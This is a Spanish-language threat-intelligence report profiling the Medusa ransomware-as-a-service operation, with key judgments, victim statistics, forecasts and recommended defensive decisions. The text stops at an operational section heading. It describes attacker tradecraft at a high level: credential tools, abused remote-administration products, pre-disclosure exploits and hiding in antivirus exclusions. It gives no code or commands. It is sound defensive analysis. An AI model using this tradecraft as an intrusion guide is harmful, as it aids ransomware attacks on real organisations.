---
tlp: "TLP:CLEAR"
pap: "PAP:AMBER"
id: "CTI-2026-035"
version: "1.0"
tipo: "Perfil de operación de extorsión"
foco_regional: "Global · Latinoamérica"
niveles: ["Estratégico", "Operacional", "Táctico", "Técnico"]
actor: "Medusa"
fecha: "2026-11-17"
caduca: "2027-02-17"
autor: "Célula CTI"
distribucion: "Elaborado íntegramente con fuentes abiertas TLP:CLEAR, con el aviso conjunto AA25-071A del FBI, CISA y el Departamento de Salud y Servicios Humanos de EE. UU. —actualizado el 18 de agosto de 2026 con investigaciones del FBI hasta abril de 2026— leído en original. Difusión libre, conservando la atribución de las fuentes y las salvedades metodológicas de §3."
---

# INFORME DE CIBERINTELIGENCIA — CTI-2026-035

## Medusa no elige víctimas: elige software sin parchear

### El FBI documenta que usan exploits hasta una semana antes de la divulgación, y que no desarrollan los suyos

> **Regla de oro del producto:** todo párrafo debe responder a un requisito de
> inteligencia (PIR) y habilitar una decisión. Si un párrafo no cambia lo que
> alguien va a hacer, va al anexo o se borra.

---

## 0. Cabecera de control

<!-- cti:meta -->

| Campo | Valor |
|---|---|
| Identificador | `CTI-2026-035` |
| Versión / fecha | `1.0` — 2026-11-17 (emisión inicial) |
| Tipo de producto | Perfil de operación de extorsión como servicio, más **evaluación de un adversario con acceso a exploits anterior a su divulgación pública** y de lo que eso hace al ciclo de parcheo, más **desambiguación de cuatro familias distintas que comparten nombre** |
| Niveles cubiertos | Estratégico · Operacional · Táctico · Técnico |
| Foco regional | **Ninguno, y eso es el hallazgo.** El aviso declara expresamente que estos actores operan de forma oportunista contra víctimas con software sin parchear **en lugar de centrarse en organizaciones o sectores concretos**. La afirmación del requisito sobre Colombia no está corroborada |
| Marcado de difusión | `TLP:CLEAR` · `PAP:AMBER` |
| Clasificación interna | Sin clasificar. Fuente principal gubernamental y pública |
| Requisitos atendidos | `PIR-02` (amenazas de impacto operativo y de continuidad), `PIR-09` (superficie expuesta y suficiencia del ciclo de parcheo), `PIR-12` (herramientas de administración remota como vector), `PIR-13` (mercado de accesos iniciales), `RFI-2026-11-A` |
| Solicitante / consumidor primario | Dirección, Riesgo Operacional y Jefatura de SOC. **Y el responsable del ciclo de parcheo**, que es el destinatario real de `E-a` y a quien este informe le trae una mala noticia |
| Ventana de observación | 2021-06-01 → 2026-11-17. **Ventana densa:** febrero de 2025 a abril de 2026, que es el periodo de las investigaciones del FBI que incorpora la actualización del aviso |
| Base de colección | Seis fuentes externas, **una primaria gubernamental leída en original**. Sin telemetría propia |
| Autor (analista) | Célula CTI |
| Revisión por pares | Pendiente |
| Aprobación | Pendiente |
| Caducidad / revisión | 2027-02-17 (92 días). **Revisión anticipada obligatoria con cada actualización del aviso**, que ya se ha actualizado una vez y cuya segunda versión cambió juicios de fondo |
| Productos relacionados | `CTI-2026-015` (Qilin), `CTI-2026-014` (TheGentlemen), `CTI-2026-016` (LockBit 5.0), `CTI-2026-024` (Rhysida): **las otras cuatro operaciones de extorsión de la cartera, y la comparación de `E-2` es el valor de tenerlas juntas** · `CTI-2026-028` (UNC3886: **contiene el nodo `MEDUSA` del grafo, que es un rootkit de Linux y no tiene nada que ver con esto**) · `CTI-2026-025` (lo que mide realmente un ranking de prevalencia: se hereda entero en `E-2`) |
| Paquete legible por máquina | **El aviso publica cuatro paquetes STIX 2.1**: XML y JSON de la versión de marzo de 2025, y XML y JSON de la actualización de agosto de 2026. **Los de 2026 son la fuente preferente para ingesta.** El Anexo A de este informe es una selección razonada subordinada al original |

> ⚠ **Limitación estructural, y una advertencia que hace la propia fuente.**
> **Sin telemetría propia:** `O-4` es un cuestionario. Y el aviso incluye un
> descargo que esta cartera reproduce literalmente porque es exactamente la
> política de esta casa: **«algunos de estos indicadores pueden ser legítimos.
> Las agencias recomiendan que las organizaciones investiguen o verifiquen los
> indicadores antes de actuar, por ejemplo antes de bloquear»**. En el Anexo A
> hay direcciones de proveedores de VPN comerciales y de nube: cargarlas sin
> filtrar provocará cortes de servicio propios.

---

## 1. BLUF — Juicios clave

<!-- cti:kj -->

**KJ-1.** Medusa es una operación de extorsión como servicio activa desde junio de 2021 que ha afectado a **más de 500 víctimas** hasta abril de 2026, en sectores que incluyen salud, educación, legal, seguros, tecnología y manufactura. Opera con doble extorsión —cifrado más amenaza de publicación— y desde al menos principios de 2023 con modelo de afiliados, en el que los afiliados nuevos o menos experimentados **tienen la negociación controlada centralmente por los desarrolladores**. Valoramos **casi con certeza** *(≥99 %)* que estos datos sean correctos. **Confianza: alta.** *Base:* aviso conjunto gubernamental A-1 basado en investigaciones del FBI hasta abril de 2026.

**KJ-2.** **El juicio más importante de este informe, y es incómodo para el ciclo de parcheo.** El aviso documenta que estos actores aprovechan vulnerabilidades recién anunciadas **en menos de 24 horas**, y que se les ha observado **usando exploits hasta una semana antes de la divulgación pública de la vulnerabilidad**; y añade que **no hay indicio de que desarrollen sus propios días cero**, por lo que prefieren **obtener acceso anticipado a exploits de fuentes desconocidas**. Valoramos **muy probable** *(80–95 %)* que exista un canal de suministro de exploits previo a la divulgación al que esta operación tiene acceso. **Confianza: moderada-alta.** *Base:* afirmación directa de la fuente primaria, que lo presenta como observación de sus investigaciones y no como inferencia.

**KJ-3.** La consecuencia práctica de `KJ-2` es que **la velocidad de parcheo deja de ser una defensa suficiente y pasa a ser sólo una condición necesaria**. Si la ventana de explotación puede abrirse antes de que el parche exista, la defensa tiene que incluir controles que no dependan del parche: segmentación, restricción de las herramientas de administración remota, control de egreso y vigilancia del abuso de la propia infraestructura de administración. Valoramos **probable** *(55–80 %)* que una organización con buen proceso de parcheo y sin esos controles siga siendo alcanzable por esta operación. **Confianza: moderada.** *Base:* inferencia desde el modelo documentado, no desde una medición.

**KJ-4.** **La selección es deliberadamente oportunista, y el aviso lo dice con esas palabras:** estos actores operan contra víctimas con software sin parchear **en lugar de centrarse en organizaciones o sectores concretos**. Valoramos **casi con certeza** *(≥99 %)* que no exista un criterio sectorial ni geográfico de selección. **Confianza: alta.** *Base:* afirmación explícita de la fuente, coherente con la distribución de víctimas y con el uso de corredores de acceso inicial pagados entre **100 y un millón de dólares**. Consecuencia defensiva directa: **ninguna organización puede excluirse por tamaño, sector o país.**

**KJ-5.** **La afirmación de que Colombia es uno de los países más golpeados por este grupo no está corroborada por ninguna fuente que hayamos localizado.** Los únicos datos regionales públicos que hemos encontrado son una empresa de telecomunicaciones venezolana reivindicada en 2025 y **nueve casos en Brasil** según un rastreador de sitios de filtración, por detrás de Italia y Australia, con Estados Unidos por encima del 54 % del total. Valoramos **poco probable** *(20–45 %)* que Colombia figure entre los países más afectados por esta operación concreta. **Confianza: baja.** *Base:* ausencia de evidencia, y además apoyada en recuentos de sitio de filtración, que son **datos controlados por el adversario** (`E-2`).

**KJ-6.** Hay **cuatro cosas distintas que se llaman «Medusa»**, y el propio FBI dedica una frase de su aviso a aclararlo: la variante de ransomware Medusa **no guarda relación** con la variante MedusaLocker ni con el malware móvil Medusa. **Y hay una cuarta que esta cartera ya documentó**: `MEDUSA` es también un *rootkit* público de Linux, presente en el grafo de relaciones de este repositorio por `CTI-2026-028`, sin relación alguna con esta operación. Valoramos **casi con certeza** *(≥99 %)* que la confusión entre estas cuatro cause errores de atribución y de respuesta. **Confianza: alta.** *Base:* que la agencia que investiga el caso considere necesario desambiguar en el segundo párrafo de su aviso es, en sí, la evidencia.

**KJ-7.** **Pagar no cierra el incidente, y hay un caso documentado que lo demuestra.** El FBI identificó que, después de pagar el rescate, una víctima fue contactada por **un actor de Medusa distinto** que afirmó que el negociador se había quedado con el dinero ya pagado y pidió **la mitad del importe otra vez** para entregar el «descifrador verdadero». El propio aviso ofrece dos lecturas: un esquema de triple extorsión, **o disfunción operativa y falta de cohesión dentro del grupo**. Valoramos **posibilidad real** *(45–55 %)* de que sea disfunción más que diseño. **Confianza: baja.** *Base:* un solo caso, con dos interpretaciones ofrecidas por la propia fuente. **Pero la consecuencia para una decisión de pago es la misma en ambas lecturas.**

**Qué cambiaría estos juicios.** **(a)** La identificación pública del canal de suministro de exploits anterior a la divulgación, que convertiría `KJ-2` en una línea de acción y no sólo en una advertencia. **(b)** Una tercera actualización del aviso, que ya cambió juicios de fondo en la segunda. **(c)** Datos de un CSIRT regional sobre víctimas por país, que resolverían `KJ-5` en cualquiera de los dos sentidos. **(d)** Una acción policial contra la operación, que en esta cartera ya se ha visto no equivaler a cese (`CTI-2026-016`, `CTI-2026-034`).

---

## 2. Resumen ejecutivo

Medusa es la operación de extorsión más **aburridamente peligrosa** de esta cartera, y los dos adjetivos importan.

Aburrida porque no hay nada ingenioso en ella. Entra por vulnerabilidades conocidas de productos muy desplegados —una herramienta de asistencia remota, un gestor de dispositivos de un fabricante de cortafuegos, un servidor de transferencia de ficheros, una solución de gestión de accesos privilegiados— o por credenciales robadas mediante correos fraudulentos, o simplemente **comprando el acceso ya hecho** a corredores especializados, a los que paga entre cien dólares y un millón según lo que valga la puerta. Dentro, no usa malware exótico: usa PowerShell, las utilidades del propio Windows, escáneres de red comerciales, Mimikatz, PsExec y, sobre todo, **programas legítimos de administración remota**. Y al final cifra con un ejecutable llamado `gaze.exe`, deja una nota y publica a la víctima en un sitio de filtraciones con un reloj en cuenta atrás.

Peligrosa por dos motivos que no tienen que ver con su sofisticación.

**El primero está en una sola frase del aviso conjunto y cambia la premisa de cualquier programa de parcheo.** El FBI documenta que estos actores aprovechan las vulnerabilidades recién anunciadas **en menos de veinticuatro horas** y —esto es lo relevante— que se les ha observado **usando exploits hasta una semana antes de que la vulnerabilidad se divulgara públicamente**. Y añade que **no hay indicio de que desarrollen capacidad propia de día cero**: prefieren obtener acceso anticipado a los exploits de fuentes desconocidas, o aprovechar los recién anunciados antes de que las víctimas puedan parchear.

Léase despacio, porque la implicación es grande: **durante parte de la ventana de riesgo, el parche no existía**. Un programa de gestión de vulnerabilidades perfecto —que detecta el aviso el día cero y despliega en veinticuatro horas— sigue llegando tarde en esos casos. Eso no convierte el parcheo en inútil; lo convierte en **necesario y no suficiente**, y obliga a que haya una segunda capa que no depende del parche: segmentación, control de qué herramientas de administración remota pueden existir y hablar con fuera, y vigilancia del abuso de la infraestructura legítima de administración. Es `KJ-3` y es el eje de `E-4`.

**El segundo es que su criterio de selección no admite excepciones.** El aviso dice, literalmente, que estos actores operan de forma **oportunista** contra víctimas con software sin parchear **en lugar de centrarse en organizaciones o sectores concretos**. No hay «no somos del sector que atacan». No hay «somos demasiado pequeños». El criterio es tener algo sin parchear a la vista, y lo cumplen todos los sectores que el aviso enumera: médico, educación, legal, seguros, tecnología y manufactura — es decir, casi cualquier organización.

**Hay dos detalles más que conviene llevarse, y uno es operativamente valioso.**

El valioso: para verificar que un exploit ha funcionado, estos actores usan un servicio público de verificación fuera de banda, y lo hacen enviando una petición a un dominio con una estructura muy concreta — **un subdominio que contiene el nombre de la propia víctima** seguido de treinta y tres caracteres aleatorios. Eso significa que una consulta de DNS saliente hacia uno de esos tres dominios, **conteniendo nuestro propio nombre**, es evidencia casi inequívoca de que alguien acaba de explotar algo nuestro. Es la detección de mayor valor y menor coste de todo este informe, y está en `D-1`.

El segundo: estos actores **eligen la herramienta de administración remota según lo que ya haya en el entorno de la víctima** — el aviso nombra ocho productos comerciales distintos—, precisamente para que su presencia no destaque. Eso convierte el inventario de herramientas de administración remota en un control de seguridad: **si no se sabe cuáles hay, no se puede saber cuál es la de más**.

**Y una advertencia sobre el nombre, que no es pedantería.** El propio FBI dedica una frase de su aviso a aclarar que esta variante **no guarda relación** con MedusaLocker ni con el malware móvil Medusa. A esas tres hay que añadir una cuarta que este repositorio ya tiene documentada: `MEDUSA` es también un *rootkit* público de Linux, y está en el grafo de relaciones de esta cartera por un informe distinto. **Cuatro cosas, un nombre.** Un informe interno que diga «nos afecta Medusa» sin precisar cuál puede movilizar la respuesta equivocada por completo.

<!-- cti:cards -->

| Rasgo | Qué significa | Etiqueta |
|---|---|---|
| Exploits antes de la divulgación pública | **El parche no existía durante parte de la ventana.** Parchear rápido es necesario y ha dejado de ser suficiente: hace falta una capa que no dependa del parche | `01 · la mala noticia` |
| Selección puramente oportunista | El aviso lo dice con esas palabras. **Nadie puede excluirse por sector, tamaño o país** | `02 · sin excepciones` |
| El acceso se compra, de 100 a 1.000.000 de dólares | Hay un mercado, y los corredores **trabajan para varias operaciones a la vez**. Nuestra puerta puede estar ya vendida y revendida | `03 · mercado de accesos` |
| La herramienta de administración remota se elige por mimetismo | Ocho productos comerciales distintos, seleccionados **según lo que ya haya en el entorno**. El inventario de estas herramientas es un control de seguridad | `04 · mimetismo` |
| El nombre de la víctima viaja en una consulta de DNS | La verificación del exploit deja **nuestro propio nombre** en una consulta saliente. Detección de altísima fidelidad y coste casi nulo | `05 · el regalo` |
| Pagar no cierra el incidente | Un caso documentado: después de pagar, **otro actor del mismo grupo** pidió la mitad otra vez. Triple extorsión o disfunción; para la decisión de pago da igual | `06 · el pago` |
| Cuatro cosas se llaman Medusa | Y el FBI tiene que aclararlo en su propio aviso. **Una de las cuatro ya está en el grafo de esta cartera y no es ésta** | `07 · el nombre` |

<!-- cti:stats -->

| Cifra | Qué mide | Contexto |
|---|---|---|
| `>500` | Víctimas afectadas hasta **abril de 2026** | Frente a unas 300 en la versión de febrero de 2025 del mismo aviso: **el ritmo se ha mantenido** |
| `1 semana` | **Antelación máxima observada respecto a la divulgación pública de la vulnerabilidad** | Y sin desarrollar los exploits: los obtienen de fuentes desconocidas. **Es el dato que invierte la premisa del parcheo** |
| `<24 h` | Tiempo en que aprovechan una vulnerabilidad recién anunciada | El margen real de un ciclo de parcheo frente a esta operación |
| `100 – 1.000.000 $` | Rango de pago a corredores de acceso inicial | Más la oferta de trabajar en exclusiva. **La mayoría de los corredores, según el aviso, prefiere trabajar para varias operaciones a la vez** |
| `8` | Productos comerciales de administración remota distintos observados | AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp y Splashtop |
| `48 h` | Plazo que da la nota de rescate para el primer contacto | Por chat en Tor o por un servicio de mensajería cifrada |
| `10.000 $` | Precio de añadir **un día** al reloj de la cuenta atrás | El grupo vende además los datos a terceros antes de que el reloj expire |
| `4` | Cosas distintas llamadas «Medusa» | Esta variante, MedusaLocker, el malware móvil, **y un *rootkit* de Linux que ya está en el grafo de esta cartera** |
| `0` | Datos públicos localizados sobre víctimas en Colombia, Chile o Perú | **Es el dato que el requisito daba por distinto** |

> ✅ **Decisiones que se solicitan, con plazo.**
> **(a) 7 días:** desplegar `D-1`, la detección de consultas de DNS a los tres dominios de verificación fuera de banda. **Fidelidad casi perfecta, coste casi nulo, y confirma explotación en curso** (`E-a`).
> **(b) 14 días:** inventariar **todas** las herramientas de administración remota presentes en el parque y decidir cuáles están autorizadas; bloquear el resto por ejecución y por egreso (`E-b`).
> **(c) 14 días:** parchear las cuatro vulnerabilidades del Anexo A.1, y **revisar si las herramientas que esas vulnerabilidades afectan siguen expuestas a Internet** (`E-c`).
> **(d) 30 días, y es la decisión de fondo:** definir la segunda capa de defensa **que no dependa del parche**, porque `KJ-2` dice que el parche puede no existir cuando empieza la explotación (`E-d`).
> **(e) 30 días:** verificar que las exclusiones del antivirus están inventariadas y revisadas. **Estos actores colocan sus herramientas dentro de carpetas ya excluidas** (`E-e`).
> **(f) 45 días:** decisión de Dirección y Legal sobre la política de pago, **a la luz del caso documentado en que pagar no cerró el incidente** (`E-f`).
> **(g) Inmediato:** fijar en los documentos internos cuál de los cuatro «Medusa» se está nombrando (`E-g`).

---

## 3. Alcance, requisitos y limitaciones

**3.1 Requisitos de inteligencia atendidos**

| Req. | Enunciado | ¿Respondido? | Dónde |
|---|---|---|---|
| PIR-02 | ¿Qué amenazas pueden detener nuestra operación? | **Sí**, con cadena completa hasta el impacto | `T-1`, `O-3` |
| PIR-09 | ¿Es suficiente nuestro ciclo de parcheo? | **Sí, y la respuesta es que no puede serlo solo** | `KJ-2`, `KJ-3`, `E-d` |
| PIR-12 | ¿Qué riesgo introducen las herramientas de administración remota? | **Sí, y es la medida de mejor relación coste-beneficio** | `KJ-4`, `E-b`, `H-3` |
| PIR-13 | ¿Cómo funciona el mercado de accesos iniciales? | **Sí, con cifras** | `O-3.A`, `E-1` |
| RFI-2026-11-A | El requisito afirmaba que Colombia es uno de los países más golpeados. ¿Se sostiene? | **No se ha podido corroborar.** Véase `3.5` | `KJ-5`, `3.5`, `E-2` |
| PIR-04 | ¿Nos afecta? | **No.** Requiere telemetría propia | `O-4`, sin evaluar |

**3.2 Fuera de alcance.** No se evalúan: la atribución del grupo a ninguna nacionalidad, que ninguna fuente pública establece y que el aviso no aborda; la negociación con el adversario como disciplina, que es materia de un producto distinto; el análisis criptográfico del encriptador más allá de lo que publica el aviso; las otras tres familias llamadas «Medusa», salvo para desambiguar; y la actividad de cada afiliado por separado, que el aviso no distingue.

**3.3 Limitaciones de la colección.** Seis.

1. **Sin telemetría propia.** `O-4` es un cuestionario.
2. **Las cifras de víctimas no son comparables entre fuentes.** El aviso dice más de 500 hasta abril de 2026; un rastreador de sitios de filtración dice 508 a marzo de 2026 y otro 517 a mediados de agosto; y **uno de ellos sitúa el inicio de la operación en 2023 cuando el aviso lo sitúa en junio de 2021**. Se usa la cifra del aviso y se declara la discrepancia.
3. **Los recuentos por país proceden de sitios de filtración**, que son **datos controlados por el adversario**: miden lo que el grupo decide publicar, no lo que ocurrió. `CTI-2026-025` dedica una sección a este sesgo y se hereda entera.
4. **El aviso es estadounidense y su geografía lo refleja.** Los sectores que enumera son categorías de infraestructura crítica de EE. UU. Su silencio sobre Latinoamérica no es evidencia de ausencia.
5. **El canal de suministro de exploits anterior a la divulgación no está identificado.** La fuente afirma su existencia y declara desconocer el origen. Es la brecha `G-1` y la más importante del informe.
6. **El aviso declara que algunos de sus indicadores pueden ser legítimos** y pide verificarlos antes de bloquear. En el Anexo A hay direcciones de proveedores de VPN comerciales y de nube.

**3.4 Metodología.** ICD 203. Código Admiralty doble (Anexo B). **MITRE ATT&CK v19**, la versión que usa el aviso. Pirámide del Dolor. ACH y pre-mortem en `O-6`. **Y una técnica estructurada que este informe aplica de forma explícita: la desambiguación previa de un nombre compartido**, que está en `O-1` y cuyo método se generaliza en el Anexo D.

**3.5 Lo que el requisito afirmaba, y lo que las fuentes sostienen**

<!-- cti:table highlight="NO corroborado|Parcial" -->

| # | Afirmación del requisito | Veredicto | Qué dicen las fuentes |
|---|---|---|---|
| 1 | «Medusa… destacado en la telemetría regional de 2026» | **Parcial, y depende de qué se llame telemetría** | La operación es indiscutiblemente relevante en 2026: más de 500 víctimas y un aviso conjunto actualizado en agosto. **Pero «telemetría regional» sugiere medición propia de la región, y lo que existe son recuentos de sitios de filtración**, que son datos del adversario |
| 2 | «Con **Colombia** como uno de los países más golpeados» | **NO corroborado** | No hemos localizado ninguna fuente que sitúe a Colombia entre los países más afectados por esta operación. Los únicos datos regionales encontrados: **una empresa de telecomunicaciones venezolana** reivindicada en 2025 y **nueve casos en Brasil** según un rastreador, por detrás de Italia y Australia. Estados Unidos, por encima del 54 % |
| 3 | «En los sectores educativo, gubernamental y de salud» | **Corroborado como sectores de la operación; NO corroborado como distribución regional** | El aviso enumera médico, educación, legal, seguros, tecnología y manufactura, y añade que **el sector de salud y salud pública ha sido víctima frecuente** —tanto que el Departamento de Salud estadounidense se incorporó como cofirmante del aviso—. **Pero esos sectores son globales, no regionales** |
| 4 | Implícito: que es un grupo con criterio de selección sectorial o geográfico | **Falsado por la fuente** | El aviso dice expresamente que operan **de forma oportunista contra víctimas con software sin parchear en lugar de centrarse en organizaciones o sectores concretos**. **La ausencia de criterio es el criterio**, y tiene una consecuencia defensiva más fuerte que cualquier lista de sectores |

> ⚠ **Por qué la corrección del punto 4 es la más útil del informe.** Un informe
> que dijera «Medusa ataca educación, gobierno y salud en Colombia» produce una
> conclusión cómoda en cualquier organización que no sea esas tres cosas en ese
> país. **El aviso dice lo contrario y es mucho menos tranquilizador:** no hay
> criterio, y por tanto no hay exención. La pregunta que este informe pide
> hacerse no es «¿somos del perfil?» sino `E-c`: **¿tenemos algo sin parchear a
> la vista?** — con el agravante de `KJ-2`, que es que a veces el parche aún no
> existe.

---

# NIVEL ESTRATÉGICO
### Para: Consejo · CISO · Riesgo · Legal · Horizonte: 6–24 meses

## E-1. Qué representa esta operación, y la frase que lo cambia todo

Esta cartera ya tiene cuatro informes de operaciones de extorsión y el patrón común es conocido: entrada por el perímetro o por credenciales, escalada, exfiltración, cifrado, doble extorsión. Medusa encaja en ese patrón sin aportar nada nuevo **excepto una cosa**, y esa cosa justifica el informe entero.

**La frase.** El aviso afirma que estos actores aprovechan los exploits recién anunciados **en menos de veinticuatro horas** y que **se les ha observado usar exploits hasta una semana antes de la divulgación pública de la vulnerabilidad**; que **no hay indicio de que desarrollen sus propios días cero o n-días**; y que prefieren **obtener acceso anticipado a exploits de fuentes desconocidas**.

**Las tres afirmaciones juntas describen un mercado, no una capacidad.** Un grupo criminal que no desarrolla exploits pero los tiene antes que el público es un grupo que **compra**, y eso implica un vendedor con acceso previo a la divulgación: alguien dentro del proceso de descubrimiento, de notificación coordinada o de desarrollo del parche, o un investigador que vende por dos canales. El aviso no especula sobre el origen y declara desconocerlo. Nosotros tampoco vamos a especular. **Pero la consecuencia defensiva no depende de saber quién vende.**

**La consecuencia es que hay que separar dos cosas que casi todos los programas de seguridad tratan como una.** «Gestión de vulnerabilidades» se evalúa normalmente por una métrica de velocidad: cuánto tardamos desde que se publica un aviso hasta que el parche está puesto. Esa métrica supone que el riesgo empieza con la publicación. **Si el riesgo puede empezar una semana antes, la métrica mide bien un proceso que no cubre todo el riesgo**, y la organización puede tener un cuadro de mando en verde y una ventana abierta. Lo que cubre esa diferencia no es más velocidad: son controles que no dependen del parche, y están en `E-d`.

<!-- cti:cards -->

| Cambio estructural | Por qué nos afecta | Etiqueta |
|---|---|---|
| El exploit llega antes que el parche | **Una métrica de velocidad de parcheo en verde no significa cobertura.** Hace falta una segunda capa que funcione sin parche | `01 · la premisa roto` |
| El acceso inicial es un bien de mercado | De 100 a 1.000.000 de dólares, y los corredores venden a varias operaciones a la vez. **Un acceso a nuestra red puede venderse dos veces y usarse dos veces** | `02 · reventa` |
| La operación se mimetiza con nuestra administración | Elige la herramienta de administración remota que **ya tenemos**. El ataque usa nuestro propio utillaje de soporte | `03 · mimetismo` |
| Las exclusiones del antivirus son un activo del adversario | Colocan sus herramientas **dentro de carpetas ya excluidas** de Windows Defender. Nuestra lista de exclusiones es parte de su plan | `04 · nuestras excepciones` |
| Pagar puede no cerrar nada | Caso documentado de un segundo cobro por otro actor del mismo grupo. **Y el aviso admite que podría ser simple disfunción interna**, lo que es igual de malo para quien paga | `05 · el pago` |
| El sector salud, cofirmante del aviso | El Departamento de Salud estadounidense se incorporó como cofirmante en 2026. **Para una organización sanitaria de la región, eso es la señal de prioridad** | `06 · salud` |

## E-2. Victimología, y qué mide realmente un recuento de víctimas

Aquí hay que hacer algo que esta cartera ya documentó en `CTI-2026-025` y que conviene repetir cada vez: **los recuentos de víctimas de una operación de extorsión proceden, casi siempre, de su propio sitio de filtraciones**. Es decir, **de datos que el adversario controla y publica a conveniencia**.

<!-- cti:bars title="Sectores afectados según el aviso conjunto (presencia declarada, sin jerarquía ni cifras)" -->

| Sector | Presencia declarada |
|---|---|
| Médico | `1` |
| Educación | `1` |
| Legal | `1` |
| Seguros | `1` |
| Tecnología | `1` |
| Manufactura | `1` |

> ⚠ **Tres advertencias sobre cualquier recuento de este grupo, y la tercera es
> la que invalida la afirmación del requisito.**
>
> **Primera, el sesgo de publicación del adversario.** El aviso dice que las
> víctimas que están negociando activamente **a veces no aparecen en el sitio**,
> y que el grupo usa la amenaza de publicarlas como palanca de negociación. **Las
> víctimas que pagan rápido tienden a no estar en el recuento.** Un recuento de
> sitio de filtración mide, por tanto, aproximadamente *las víctimas que no
> pagaron a tiempo*.
>
> **Segunda, la inconsistencia entre fuentes.** El aviso dice más de 500 hasta
> abril de 2026; un rastreador dice 508 a marzo de 2026 y otro 517 a mediados
> de agosto; y **uno de ellos sitúa el inicio de la operación en 2023 cuando el
> aviso lo sitúa en junio de 2021**. Cuando dos fuentes discrepan en el año de
> inicio, sus distribuciones por país no son comparables.
>
> **Tercera, y es `KJ-5`.** No hemos encontrado ninguna fuente que sitúe a
> Colombia entre los países más golpeados por esta operación. Lo que hay es
> una víctima venezolana de telecomunicaciones reivindicada en 2025 y **nueve
> casos en Brasil** en un rastreador, por detrás de Italia y Australia, con
> Estados Unidos por encima del 54 %. **Afirmar lo contrario requeriría una
> fuente que no tenemos.**

**Y la lectura que sí se sostiene, que es más útil que cualquier mapa.** El aviso declara que la selección es oportunista y que el criterio es el software sin parchear. Si eso es cierto —y lo afirma quien investigó más de quinientos casos—, entonces **la distribución geográfica de las víctimas de Medusa es, en primera aproximación, la distribución geográfica del software sin parchear expuesto a Internet**. Esa es una magnitud que sí se puede estimar para la región, que no depende del adversario, y que apunta en una dirección incómoda: la región tiene mucha administración pública y mucha educación superior con despliegues antiguos y sin ciclo de parcheo formalizado. **La exposición regional probablemente sea alta; lo que no hay es el dato que lo mida.** Es la brecha `G-3`.

## E-3. Tendencia y pronóstico

<!-- cti:chart title="Víctimas acumuladas según las dos versiones del mismo aviso conjunto" cap="Dos puntos de una fuente homogénea —el mismo aviso, actualizado— que es lo único comparable que existe. Los recuentos de rastreadores de sitios de filtración NO se mezclan aquí, por el sesgo de E-2." -->

| Periodo | Víctimas |
|---|---|
| `Feb·25` | `300` |
| `Abr·26` | `500` |

**Lo que esos dos puntos dicen con prudencia:** unas doscientas víctimas nuevas en catorce meses, es decir del orden de catorce al mes, **con la operación plenamente activa y sin señales de declive**. Y lo que no dicen: nada sobre distribución geográfica, porque el aviso no la publica.

<!-- cti:cards -->

| Escenario | Desarrollo | Etiqueta |
|---|---|---|
| **Más probable** | La operación continúa con el mismo modelo. La lista de vulnerabilidades de entrada se renueva con cada aviso relevante de un producto de administración remota, de transferencia de ficheros o de acceso privilegiado, **que son las tres categorías de producto que concentran su interés** | `Probable · 55–80 %` |
| **Alternativa creíble** | Una acción policial contra la operación o contra alguno de sus desarrolladores. **Esta cartera ya documentó dos veces que eso no equivale a cese** (`CTI-2026-016`, `CTI-2026-034`): lo habitual es fragmentación y reaparición | `Posibilidad real · 45–55 %` |
| **La que importa de verdad** | Que el canal de acceso anticipado a exploits se consolide o se amplíe a otras operaciones. **Sería el desarrollo más grave del panorama de extorsión**, porque degradaría el valor de la divulgación coordinada como mecanismo de defensa colectiva | `Posibilidad real · 45–55 %` |
| **La que importa para la región** | Publicación de datos por país de un CSIRT regional. **Resolvería `KJ-5` y, si confirma exposición alta, convertiría `E-c` en prioridad sectorial** y no sólo propia | `Poco probable · 20–45 %` |
| **Descartado, y se consigna** | Que exista un criterio de selección sectorial o geográfico del que podamos quedar fuera. **El aviso lo falsa expresamente.** Se consigna porque el requisito lo sugería y porque es la conclusión más cómoda posible | `Descartada` |

## E-4. Decisiones que este informe pide al nivel estratégico

<!-- cti:table highlight="sin depender del parche|administración remota|Inmediato" -->

| # | Decisión | Fundamento | Plazo |
|---|---|---|---|
| E-a | **Desplegar `D-1`:** detección de consultas de DNS salientes hacia los tres dominios de verificación fuera de banda del Anexo A.3 | `KJ-2`. **Fidelidad casi perfecta y coste casi nulo**, porque el subdominio contiene el nombre de la propia víctima. Un acierto aquí es explotación confirmada, no sospecha | 7 días |
| E-b | **Inventariar todas las herramientas de administración remota del parque**, decidir las autorizadas y bloquear el resto por ejecución y por egreso | `KJ-4`. El aviso nombra **ocho productos comerciales** y señala que el actor elige según lo que ya haya. **Si no sabemos cuáles hay, no podemos ver la de más** | 14 días |
| E-c | Parchear las cuatro vulnerabilidades del Anexo A.1, **y revisar si los productos que afectan siguen expuestos a Internet** | `KJ-4`. Las cuatro son de productos de administración remota, transferencia de ficheros, gestión de dispositivos de seguridad y acceso privilegiado: **las cuatro categorías que no deberían estar expuestas** | 14 días |
| E-d | **La decisión de fondo:** definir y dotar la **segunda capa de defensa que no dependa del parche** —segmentación efectiva, restricción de egreso, control de ejecución, autenticación multifactor en todo acceso remoto, y vigilancia del abuso de la infraestructura propia de administración— y dejar de evaluar la gestión de vulnerabilidades sólo por velocidad | `KJ-2`, `KJ-3`. **Si el exploit puede llegar antes que el parche, la velocidad de parcheo no puede ser la única métrica** | 30 días |
| E-e | **Inventariar y revisar las exclusiones del antivirus**, y someterlas a aprobación y revisión periódica | `O-3.C`. El actor **coloca sus herramientas dentro de carpetas ya excluidas**. Una lista de exclusiones sin dueño es una colaboración involuntaria | 30 días |
| E-f | **Decisión de Dirección y Legal sobre la política de pago**, a la luz del caso documentado en que pagar no cerró el incidente y de que no hay forma de verificar que los datos se eliminen | `KJ-7`. El aviso es explícito: **no hay manera de verificar que el grupo retire los datos de su sitio** | 45 días |
| E-g | **Fijar en todos los documentos internos cuál de los cuatro «Medusa» se nombra.** Convención propuesta: «Medusa (RaaS)» para esta operación | `KJ-6`. El FBI desambigua tres; esta cartera tiene la cuarta en su propio grafo. **Coste cero** | **Inmediato** |
| E-h | Verificar que las copias de seguridad están **fuera de línea o inmutables**, y que el procedimiento de restauración se ha probado con el parque caído | `T-1`. El encriptador detiene servicios de copia, borra instantáneas, **apaga las máquinas virtuales y las cifra**, y borra sus propias herramientas al terminar | 45 días |
| E-i | Ingerir los **paquetes STIX de agosto de 2026** del aviso, **tras filtrar** por el descargo de la propia fuente sobre indicadores potencialmente legítimos | `3.3.6`. Hay direcciones de VPN comerciales y de nube en la lista | 45 días |

---

# NIVEL OPERACIONAL
### Para: Jefatura de SOC · Respuesta a Incidentes · Threat Hunting · Horizonte: semanas–meses

## O-1. Identificación: cuatro cosas, un nombre

